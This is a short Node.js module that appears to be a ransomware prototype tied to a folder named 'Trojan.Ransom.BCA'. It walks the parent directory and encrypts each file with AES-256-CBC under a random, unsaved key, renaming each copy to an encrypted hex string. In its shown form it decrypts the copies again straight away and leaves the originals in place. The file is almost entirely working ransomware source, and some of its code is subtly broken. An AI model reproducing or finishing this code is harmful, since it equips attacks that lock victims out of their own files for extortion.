const fs = require('fs');
const crypto = require('crypto');
const path = require('path');
const moveFrom = __dirname + "/../";
const key = crypto.randomBytes(6).toString('base64');

function encrypt (pathIn) {
    const oldName = pathIn.split('/').pop();
    // const fileName = crypto.randomBytes(9).toString('base64');

    /*let newName = "/";
    while (newName.indexOf("/" > -1)) {
        let tmp = crypto.createCipher('aes-256-cbc', key);
        newName = tmp.update(oldName, 'utf-8', 'base64') + tmp.final('base64');
    }*/

    let tmp = crypto.createCipher('aes-256-cbc', key);
    const newName = tmp.update(oldName, 'utf-8', 'hex') + tmp.final('hex');
    
    let cipher = crypto.createCipher('aes-256-cbc', key);
    let input = fs.createReadStream(pathIn);
    let output = fs.createWriteStream(moveFrom + newName);

    input.pipe(cipher).pipe(output);

    output.on('finish', function() {
        console.log('Encrypted file written to disk!');
        decrypt(moveFrom + newName);
    });
}

function decrypt (pathIn) {
    const oldName = pathIn.split('/').pop();
    let tmp = crypto.createDecipher('aes-256-cbc', key);
    const newName = tmp.update(oldName, 'hex','utf8') + tmp.final('utf8');

    let decipher = crypto.createDecipher('aes-256-cbc', key);
    let input = fs.createReadStream(pathIn);
    let output = fs.createWriteStream(moveFrom + "NEW_" + newName);

    input.pipe(decipher).pipe(output);

    output.on('finish', function() {
        console.log('Decrypted file written to disk!');
    });

}

function search () {
    // Loop through all the files in the temp directory
    fs.readdir( moveFrom, function( err, files ) {
        if( err ) {
            console.error("Could not list the directory.", err );
            process.exit( 1 );
        }

        files.forEach( function( file, index ) {
            // Make one pass and make the file complete
            let fromPath = path.join( moveFrom, file );

            fs.stat( fromPath, function( error, stat ) {
                if( error ) {
                    console.error( "Error stating file.", error );
                    return;
                }

                if( stat.isFile() ) {
                    console.log( "'%s' is a file.", fromPath );
                    if (file === ".DS_Store")
                        return;
                    else {
                        encrypt(fromPath);
                    }
                }
                else if(stat.isDirectory()) {
                    console.log( "'%s' is a directory.", fromPath );
                    if (file === "Trojan.Ransom.BCA")
                        return;
                }

            } );
        } );
    } );
}

function process () {
    search();
/*    encrypt();
    setTimeout(decrypt, 1000);*/
}

module.exports = {
    process: function () {
        process();
    }
};